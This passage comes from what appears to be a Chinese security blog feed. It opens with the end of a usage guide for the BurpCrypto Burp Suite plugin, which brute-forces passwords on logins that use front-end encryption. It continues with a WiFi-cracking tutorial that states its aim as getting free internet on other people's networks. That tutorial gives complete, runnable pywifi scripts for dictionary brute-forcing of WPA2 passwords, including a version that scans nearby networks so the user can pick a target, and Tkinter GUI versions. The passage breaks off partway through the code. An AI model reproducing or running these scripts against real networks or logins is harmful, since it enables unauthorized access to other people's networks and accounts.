href="https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></p></blockquote><p><strong>八、补充阅读</strong></p><p>对单加密参数的登录接口进行密码爆破的一种方法，ExecJS模块使用由于软件开发的复杂性，诸如多层嵌套加密、引入时间变量、动态密钥、魔改加密算法、新算法的涌现，插件注定永远无法做到对所有加密算法的百分百覆盖，所以提供了ExecJS模块，为动手能力较强的使用者提供一条新途径。</p><blockquote><p>因JS新特性的快速迭代，插件中内置了Rhino、HtmlUnit、Jre内置三种JS执行引擎，各种执行引擎的优劣势可参阅BurpCrypto未来开发计划中对于各个引擎的特性介绍。</p></blockquote><h3 id="九、编写简单的JS脚本"><a href="#九、编写简单的JS脚本" class="headerlink" title="九、编写简单的JS脚本"></a><strong>九、编写简单的JS脚本</strong></h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理-加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。"><a href="#使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理-加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。" class="headerlink" title="使用ExecJS模块前需要先切换至插件的ExecJS选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理&#x2F;加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。"></a>使用ExecJS模块前需要先切换至插件的<code>ExecJS</code>选项卡，像常见编程语言一样，你需要编写一个入口函数。不过不同于其他编程语言的入口函数，插件将会把待处理&#x2F;加密的内容传递给入口函数的第一个参数，而你编写的入口函数则需要在处理结束后返回处理结果。</h3><p>为了方便使用，插件内置了一个快速生成函数体的菜单，在代码编辑器中的右键菜单中点击<code>Append Simple Function</code>，即可生成一个空函数<code>calc</code>，并自动在下面的入口函数名填写入口函数为<code>calc</code>。</p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/3.png"></p><p>我们可以对该函数进行一些简单的修改，下面是一个示例脚本，该脚本将会把输入的内容倒转后再返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function calc(pass) &#123;  </span><br><span class="line">     return pass.split(&quot;&quot;).reverse().join(&quot;&quot;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编辑完成后，点击<code>Add processor</code>即可添加成功。</p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/4.png"></p><h3 id="十、引用内置JS库"><a href="#十、引用内置JS库" class="headerlink" title="十、引用内置JS库"></a><strong>十、引用内置JS库</strong></h3><blockquote><p>目前内置的JS库只有MD5与Base64，后续版本将会上线在线JS仓库，操作步骤将会发生变动。</p></blockquote><p>为避免常见库的频繁整理导入的工作量，插件目前内置了MD5和Base64库，使用方法为在编辑器的右键菜单中的<code>Include Snippet</code>选中需要的JS库，即可引入。</p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/5.png"></p><p><strong>十一、在功能区中调用插件</strong></p><p>加密，通过在上述几个模块中成功添加processor后，即可通过以下两个渠道进行使用。</p><p>QuickCrypto（全局调用）</p><p>BurpCrypto几乎可以在BurpSuite的任何位置进行调用，调用方法也较为简单，以下动图为示例：</p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/6.png"></p><p><strong>十二、Intruder（爆破模块）</strong></p><p>在爆破模块中引用：</p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/7.png"></p><h3 id="十三、解密（查询原文）"><a href="#十三、解密（查询原文）" class="headerlink" title="十三、解密（查询原文）"></a><strong>十三、解密（查询原文）</strong></h3><p>由于部分算法产生的结果具有不可逆性（哈希算法、自定义的JS代码等），所以通过本插件生成的所有结果均被保存到本地的K&#x2F;V数据库中，可以通过插件中的<code>Get PlainText</code>功能获取原始明文。</p><p>使用方法为完整选中密文内容，右单击后找到BurpCrypto菜单中的<code>Get PlainText</code>功能，</p><blockquote><p>此处演示的是RSA公钥加密后通过密文查询原始明文。</p></blockquote><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/8.png"></p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/9.png"></p><p><strong>十四、结尾</strong></p><p>以上为本插件的使用说明，后续将会将会陆续加入国密算法、ExecJS远程模块，模块互调等小功能更新与Bug修复，如果各位师傅有更多的建议也欢迎提PR或者Issure，谢谢！</p><p><strong><strong>本文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！</strong></strong></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Python破解Wifi密码教程来了</title>
      
      <link href="/2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/"/>
      <url>/2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文将记录学习下如何通过 Python 脚本实现 WIFI 密码的暴力破解，从而实现免费蹭网。</p><h3 id="无图形界面"><a href="#无图形界面" class="headerlink" title="无图形界面"></a>无图形界面</h3><p>先来看看没有图形界面版的爆破脚本。</p><h2 id="WIFI爆破"><a href="#WIFI爆破" class="headerlink" title="WIFI爆破"></a><strong>WIFI爆破</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import pywifi</span><br><span class="line">from pywifi import const</span><br><span class="line">import time</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试连接，返回链接结果</span><br><span class="line">def wifiConnect(pwd):</span><br><span class="line">    # 抓取网卡接口</span><br><span class="line">    wifi = pywifi.PyWiFi()</span><br><span class="line">    # 获取第一个无线网卡</span><br><span class="line">    ifaces = wifi.interfaces()[0]</span><br><span class="line">    # 断开所有连接</span><br><span class="line">    ifaces.disconnect()</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    wifistatus = ifaces.status()</span><br><span class="line">    if wifistatus == const.IFACE_DISCONNECTED:</span><br><span class="line">        # 创建WiFi连接文件</span><br><span class="line">        profile = pywifi.Profile()</span><br><span class="line">        # 要连接WiFi的名称</span><br><span class="line">        profile.ssid = &quot;Tr0e&quot;</span><br><span class="line">        # 网卡的开放状态</span><br><span class="line">        profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line">        # wifi加密算法,一般wifi加密算法为wps</span><br><span class="line">        profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line">        # 加密单元</span><br><span class="line">        profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class="line">        # 调用密码</span><br><span class="line">        profile.key = pwd</span><br><span class="line">        # 删除所有连接过的wifi文件</span><br><span class="line">        ifaces.remove_all_network_profiles()</span><br><span class="line">        # 设定新的连接文件</span><br><span class="line">        tep_profile = ifaces.add_network_profile(profile)</span><br><span class="line">        ifaces.connect(tep_profile)</span><br><span class="line">        # wifi连接时间</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        if ifaces.status() == const.IFACE_CONNECTED:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;已有wifi连接&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 读取密码本</span><br><span class="line">def readPassword():</span><br><span class="line">    success = False</span><br><span class="line">    print(&quot;****************** WIFI破解 ******************&quot;)</span><br><span class="line">    # 密码本路径</span><br><span class="line">    path = &quot;pwd.txt&quot;</span><br><span class="line">    # 打开文件</span><br><span class="line">    file = open(path, &quot;r&quot;)</span><br><span class="line">    start = datetime.datetime.now()</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            pwd = file.readline()</span><br><span class="line">            # 去除密码的末尾换行符</span><br><span class="line">            pwd = pwd.strip(&#x27;\n&#x27;)</span><br><span class="line">            bool = wifiConnect(pwd)</span><br><span class="line">            if bool:</span><br><span class="line">                print(&quot;[*] 密码已破解：&quot;, pwd)</span><br><span class="line">                print(&quot;[*] WiFi已自动连接！！！&quot;)</span><br><span class="line">                success = True</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                # 跳出当前循环，进行下一次循环</span><br><span class="line">                print(&quot;正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s&quot;%(&quot;Tr0e&quot;,pwd))</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    end = datetime.datetime.now()</span><br><span class="line">    if(success):</span><br><span class="line">        print(&quot;[*] 本次破解WIFI密码一共用了多长时间：&#123;&#125;&quot;.format(end - start))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    readPassword()</span><br></pre></td></tr></table></figure><p>代码运行效果：<br><img src="/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/1.png"></p><h2 id="脚本优化"><a href="#脚本优化" class="headerlink" title="脚本优化"></a><strong>脚本优化</strong></h2><p>以上脚本需内嵌 WIFI 名、爆破字典路径，缺少灵活性。下面进行改造优化：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import pywifi</span><br><span class="line">import time</span><br><span class="line">from pywifi import const</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># WiFi扫描模块</span><br><span class="line">def wifi_scan():</span><br><span class="line">    # 初始化wifi</span><br><span class="line">    wifi = pywifi.PyWiFi()</span><br><span class="line">    # 使用第一个无线网卡</span><br><span class="line">    interface = wifi.interfaces()[0]</span><br><span class="line">    # 开始扫描</span><br><span class="line">    interface.scan()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        print(&#x27;\r扫描可用 WiFi 中，请稍后。。。（&#x27; + str(3 - i), end=&#x27;）&#x27;)</span><br><span class="line">    print(&#x27;\r扫描完成！\n&#x27; + &#x27;-&#x27; * 38)</span><br><span class="line">    print(&#x27;\r&#123;:4&#125;&#123;:6&#125;&#123;&#125;&#x27;.format(&#x27;编号&#x27;, &#x27;信号强度&#x27;, &#x27;wifi名&#x27;))</span><br><span class="line">    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象</span><br><span class="line">    bss = interface.scan_results()</span><br><span class="line">    # 存放wifi名的集合</span><br><span class="line">    wifi_name_set = set()</span><br><span class="line">    for w in bss:</span><br><span class="line">        # 解决乱码问题</span><br><span class="line">        wifi_name_and_signal = (100 + w.signal, w.ssid.encode(&#x27;raw_unicode_escape&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class="line">        wifi_name_set.add(wifi_name_and_signal)</span><br><span class="line">    # 存入列表并按信号排序</span><br><span class="line">    wifi_name_list = list(wifi_name_set)</span><br><span class="line">    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)</span><br><span class="line">    num = 0</span><br><span class="line">    # 格式化输出</span><br><span class="line">    while num &lt; len(wifi_name_list):</span><br><span class="line">        print(&#x27;\r&#123;:&lt;6d&#125;&#123;:&lt;8d&#125;&#123;&#125;&#x27;.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))</span><br><span class="line">        num += 1</span><br><span class="line">    print(&#x27;-&#x27; * 38)</span><br><span class="line">    # 返回wifi列表</span><br><span class="line">    return wifi_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># WIFI破解模块</span><br><span class="line">def wifi_password_crack(wifi_name):</span><br><span class="line">    # 字典路径</span><br><span class="line">    wifi_dic_path = input(&quot;请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：&quot;)</span><br><span class="line">    with open(wifi_dic_path, &#x27;r&#x27;) as f:</span><br><span class="line">        # 遍历密码</span><br><span class="line">        for pwd in f:</span><br><span class="line">            # 去除密码的末尾换行符</span><br><span class="line">            pwd = pwd.strip(&#x27;\n&#x27;)</span><br><span class="line">            # 创建wifi对象</span><br><span class="line">            wifi = pywifi.PyWiFi()</span><br><span class="line">            # 创建网卡对象，为第一个wifi网卡</span><br><span class="line">            interface = wifi.interfaces()[0]</span><br><span class="line">            # 断开所有wifi连接</span><br><span class="line">            interface.disconnect()</span><br><span class="line">            # 等待其断开</span><br><span class="line">            while interface.status() == 4:</span><br><span class="line">                # 当其处于连接状态时，利用循环等待其断开</span><br><span class="line">                pass</span><br><span class="line">            # 创建连接文件（对象）</span><br><span class="line">            profile = pywifi.Profile()</span><br><span class="line">            # wifi名称</span><br><span class="line">            profile.ssid = wifi_name</span><br><span class="line">            # 需要认证</span><br><span class="line">            profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line">            # wifi默认加密算法</span><br><span class="line">            profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line">            profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class="line">            # wifi密码</span><br><span class="line">            profile.key = pwd</span><br><span class="line">            # 删除所有wifi连接文件</span><br><span class="line">            interface.remove_all_network_profiles()</span><br><span class="line">            # 设置新的wifi连接文件</span><br><span class="line">            tmp_profile = interface.add_network_profile(profile)</span><br><span class="line">            # 开始尝试连接</span><br><span class="line">            interface.connect(tmp_profile)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            while time.time() - start_time &lt; 1.5:</span><br><span class="line">                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）</span><br><span class="line">                if interface.status() == 4:</span><br><span class="line">                    print(f&#x27;\r连接成功！密码为：&#123;pwd&#125;&#x27;)</span><br><span class="line">                    exit(0)</span><br><span class="line">                else:</span><br><span class="line">                    print(f&#x27;\r正在利用密码 &#123;pwd&#125; 尝试破解。&#x27;, end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># 主函数</span><br><span class="line">def main():</span><br><span class="line">    # 退出标致</span><br><span class="line">    exit_flag = 0</span><br><span class="line">    # 目标编号</span><br><span class="line">    target_num = -1</span><br><span class="line">    while not exit_flag:</span><br><span class="line">        try:</span><br><span class="line">            print(&#x27;WiFi万能钥匙&#x27;.center(35, &#x27;-&#x27;))</span><br><span class="line">            # 调用扫描模块，返回一个排序后的wifi列表</span><br><span class="line">            wifi_list = wifi_scan()</span><br><span class="line">            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理</span><br><span class="line">            choose_exit_flag = 0</span><br><span class="line">            while not choose_exit_flag:</span><br><span class="line">                try:</span><br><span class="line">                    target_num = int(input(&#x27;请选择你要尝试破解的wifi：&#x27;))</span><br><span class="line">                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入</span><br><span class="line">                    if target_num in range(len(wifi_list)):</span><br><span class="line">                        # 二次确认</span><br><span class="line">                        while not choose_exit_flag:</span><br><span class="line">                            try:</span><br><span class="line">                                choose = str(input(f&#x27;你选择要破解的WiFi名称是：&#123;wifi_list[target_num][1]&#125;，确定吗？（Y/N）&#x27;))</span><br><span class="line">                                # 对用户输入进行小写处理，并判断</span><br><span class="line">                                if choose.lower() == &#x27;y&#x27;:</span><br><span class="line">                                    choose_exit_flag = 1</span><br><span class="line">                                elif choose.lower() == &#x27;n&#x27;:</span><br><span class="line">                                    break</span><br><span class="line">                                # 处理用户其它字母输入</span><br><span class="line">                                else:</span><br><span class="line">                                    print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)</span><br><span class="line">                            # 处理用户非字母输入</span><br><span class="line">                            except ValueError:</span><br><span class="line">                                print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)</span><br><span class="line">                        # 退出破解</span><br><span class="line">                        if choose_exit_flag == 1:</span><br><span class="line">                            break</span><br><span class="line">                        else:</span><br><span class="line">                            print(&#x27;请重新输入哦(*^▽^*)&#x27;)</span><br><span class="line">                except ValueError:</span><br><span class="line">                    print(&#x27;只能输入数字哦o(*￣︶￣*)o&#x27;)</span><br><span class="line">            # 密码破解，传入用户选择的wifi名称</span><br><span class="line">            wifi_password_crack(wifi_list[target_num][1])</span><br><span class="line">            print(&#x27;-&#x27; * 38)</span><br><span class="line">            exit_flag = 1</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>脚本运行效果如下：<br><img src="/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/2.png"></p><p>上述代码实现了依据信号强度枚举当前附近的所有 WIFI 名称，并且可供用户自主选择需要暴力破解的 WIFI，同时还可灵活指定暴力破解的字典，相对而言体验感提升了不少。进一步也可以将上述脚本打包生成 exe 文件，双击运行效果如下：</p><p><img src="/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/3.png"></p><h3 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h3><p>下面基于 Python 的 GUI 图形界面开发库 Tkinter 优化上述脚本，实现友好的可视化 WIFI 暴力破解界面工具。</p><p>关于 Tkinter 库的语法可参见：</p><p><a href="https://www.runoob.com/python/python-gui-tkinter.html">https://www.runoob.com/python/python-gui-tkinter.html</a></p><h2 id="简单版UI"><a href="#简单版UI" class="headerlink" title="简单版UI"></a><strong>简单版UI</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from pywifi import const</span><br><span class="line">import pywifi</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 主要步骤：</span><br><span class="line"># 1、获取第一个无线网卡</span><br><span class="line"># 2、断开所有的wifi</span><br><span class="line"># 3、读取密码本</span><br><span class="line"># 4、设置睡眠时间</span><br><span class="line">def wificonnect(str, wifiname):</span><br><span class="line">    # 窗口无线对象</span><br><span class="line">    wifi = pywifi.PyWiFi()</span><br><span class="line">    # 抓取第一个无线网卡</span><br><span class="line">    ifaces = wifi.interfaces()[0]</span><br><span class="line">    # 断开所有的wifi</span><br><span class="line">    ifaces.disconnect()</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    if ifaces.status() == const.IFACE_DISCONNECTED:</span><br><span class="line">        # 创建wifi连接文件</span><br><span class="line">        profile = pywifi.Profile()</span><br><span class="line">        profile.ssid = wifiname</span><br><span class="line">        # wifi的加密算法</span><br><span class="line">        profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class="line">        # wifi的密码</span><br><span class="line">        profile.key = str</span><br><span class="line">        # 网卡的开发</span><br><span class="line">        profile.auth = const.AUTH_ALG_OPEN</span><br><span class="line">        # 加密单元,这里需要写点加密单元否则无法连接</span><br><span class="line">        profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class="line">        # 删除所有的wifi文件</span><br><span class="line">        ifaces.remove_all_network_profiles()</span><br><span class="line">        # 设置新的连接文件</span><br><span class="line">        tep_profile = ifaces.add_network_profile(profile)</span><br><span class="line">        # 连接</span><br><span class="line">        ifaces.connect(tep_profile)</span><br><span class="line">        time.sleep(3)</span><br><span class="line">        if ifaces.status() == const.IFACE_CONNECTED:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def readPwd():</span><br><span class="line">    # 获取wiif名称</span><br><span class="line">    wifiname = entry.get().strip()</span><br><span class="line">    path = r&#x27;./pwd.txt&#x27;</span><br><span class="line">    file = open(path, &#x27;r&#x27;)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            # 读取</span><br><span class="line">            mystr = file.readline().strip()</span><br><span class="line">            # 测试连接</span><br><span class="line">            bool = wificonnect(mystr, wifiname)</span><br><span class="line">            if bool:</span><br><span class="line">                text.insert(END, &#x27;密码正确&#x27; + mystr)</span><br><span class="line">                text.see(END)</span><br><span class="line">                text.update()</span><br><span class="line">                file.close()</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                text.insert(END, &#x27;密码错误&#x27; + mystr)</span><br><span class="line">                text.see(END)</span><br><span class="line">                text.update()</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 创建窗口</span><br><span class="line">root = Tk()</span><br><span class="line">root.title(&#x27;wifi破解&#x27;)</span><br><span class="line">root.geometry(&#x27;500x400&#x27;)</span><br><span class="line"># 标签</span><br><span class="line">label = Label(root, text=&#x27;输入要破解的WIFI名称：&#x27;)</span><br><span class="line"># 定位</span><br><span class="line">label.grid()</span><br><span class="line"># 输入控件</span><br><span class="line">entry = Entry(root, font=(&#x27;微软雅黑&#x27;, 14))</span><br><span class="line">entry.grid(row=0, column=1)</span><br><span class="line"># 列表控件</span><br><span class="line">text = Listbox(root, font=(&#x27;微软雅黑&#x27;, 14), width=40, height=10)</span><br><span class="line">text.grid(row=1, columnspan=2)</span><br><span class="line"># 按钮</span><br><span class="line">button = Button(root, text=&#x27;开始破解&#x27;, width=20, height=2, command=readPwd)</span><br><span class="line">button.grid(row=2, columnspan=2)</span><br><span class="line"># 显示窗口</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p>脚本运行效果：<br><img src="/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/4.png"></p><h2 id="UI升级版"><a href="#UI升级版" class="headerlink" title="UI升级版"></a><strong>UI升级版</strong></h2><p>以上图形界面未允许选择密码字典，下面进行优化升级：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from tkinter import *</span><br><span class="line">from tkinter import ttk</span><br><span class="line">import pywifi</span><br><span class="line">from pywifi import const</span><br><span class="line">import time</span><br><span class="line">import tkinter.filedialog  # 在Gui中打开文件浏览</span><br><span class="line">import tkinter.messagebox  # 打开tkiner的消息提醒框</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MY_GUI():</span><br><span class="line">    def __init__(self, init_window_name):</span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line">        # 密码文件路径</span><br><span class="line">        self.get_value = StringVar()  # 设置可变内容</span><br><span class="line">        # 获取破解wifi账号</span><br><span class="line">        self.get_wifi_value = StringVar()</span><br><span class="line">        # 获取wifi密码</span><br><span class="line">        self.get_wifimm_value = StringVar()</span><br><span class="line">        # 抓取网卡接口</span><br><span class="line">        self.wifi = pywifi.PyWiFi()</span><br><span class="line">        # 抓取第一个无线网卡</span><br><span class="line">        self.iface = self.wifi.interfaces()[0]</span><br><span class="line">        # 测试链接断开所有链接</span><br><span class="line">        self.iface.disconnect()</span><br><span class="line">        time.sleep(1)  # 休眠1秒</span><br><span class="line">        # 测试网卡是否属于断开状态</span><br><span class="line">        assert self.iface.status() in \</span><br><span class="line">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        # 自动会调用的函数，返回自身的网卡</span><br><span class="line">        return &#x27;(WIFI:%s,%s)&#x27; % (self.wifi, self.iface.name())</span><br><span class="line"></span><br><span class="line">    # 设置窗口</span><br><span class="line">    def set_init_window(self):</span><br><span class="line">        self.init_window_name.title(&quot;WIFI破解工具&quot;)</span><br><span class="line">        self.init_window_name.geometry(&#x27;+500+200&#x27;)</span><br><span class="line">        labelframe = LabelFrame(width=400, height=200, text=&quot;配置&quot;)  # 框架，以下对象都是对于labelframe中添加的</span><br><span class="line">        labelframe.grid(column=0, row=0, padx=10, pady=10)</span><br><span class="line">        self.search = Button(labelframe, text=&quot;搜索附近WiFi&quot;, command=self.scans_wifi_list).grid(column=0, row=0)</span><br><span class="line">        self.pojie = Button(labelframe, text=&quot;开始破解&quot;, command=self.readPassWord).grid(column=1, row=0)</span><br><span class="line">        self.label = Label(labelframe, text=&quot;目录路径：&quot;).grid(column=0, row=1)</span><br><span class="line">        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)</span><br><span class="line">        self.file = Button(labelframe, text=&quot;添加密码文件目录&quot;, command=self.add_mm_file).grid(column=2, row=1)</span><br><span class="line">        self.wifi_text = Label(labelframe, text=&quot;WiFi账号：&quot;).grid(column=0, row=2)</span><br><span class="line">        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)</span><br><span class="line">        self.wifi_mm_text = Label(labelframe, text=&quot;WiFi密码：&quot;).grid(column=2, row=2)</span><br><span class="line">        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W)</span><br><span class="line">        self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)</span><br><span class="line">        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)</span><br><span class="line">        # 定义树形结构与滚动条</span><br><span class="line">        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=&quot;headings&quot;, columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))</span><br><span class="line">        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)</span><br><span class="line">        self.wifi_tree.configure(yscrollcommand=self.vbar.set)</span><br><span class="line">        # 表格的标题</span><br><span class="line">        self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)</span><br><span class="line">        self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class="line">        self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class="line">        self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class="line">        self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)</span><br><span class="line">        self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)</span><br><span class="line">        self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)</span><br><span class="line">        self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)</span><br><span class="line">        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)</span><br><span class="line">        self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;, self.onDBClick)</span><br><span class="line">        self.vbar.grid(row=4, column=1, sticky=NS)</span><br><span class="line"></span><br><span class="line">    # 搜索wifi</span><br><span class="line">    def scans_wifi_list(self):  # 扫描周围wifi列表</span><br><span class="line">        # 开始扫描</span><br><span class="line">        print(&quot;^_^ 开始扫描附近wifi...&quot;)</span><br><span class="line">        self.iface.scan()</span><br><span class="line">        time.sleep(15)</span><br><span class="line">        # 在若干秒后获取扫描结果</span><br><span class="line">        scanres = self.iface.scan_results()</span><br><span class="line">        # 统计附近被发现的热点数量</span><br><span class="line">        nums = len(scanres)</span><br><span class="line">        print(&quot;数量: %s&quot; % (nums))</span><br><span class="line">        # 实际数据</span><br><span class="line">        self.show_scans_wifi_list(scanres)</span><br><span class="line">        return scanres</span><br><span class="line"></span><br><span class="line">    # 显示wifi列表</span><br><span class="line">    def show_scans_wifi_list(self, scans_res):</span><br><span class="line">        for index, wifi_info in enumerate(scans_res):</span><br><span class="line">            self.wifi_tree.insert(&quot;&quot;, &#x27;end&#x27;, values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))</span><br><span class="line"></span><br><span class="line">    # 添加密码文件目录</span><br><span class="line">    def add_mm_file(self):</span><br><span class="line">        self.filename = 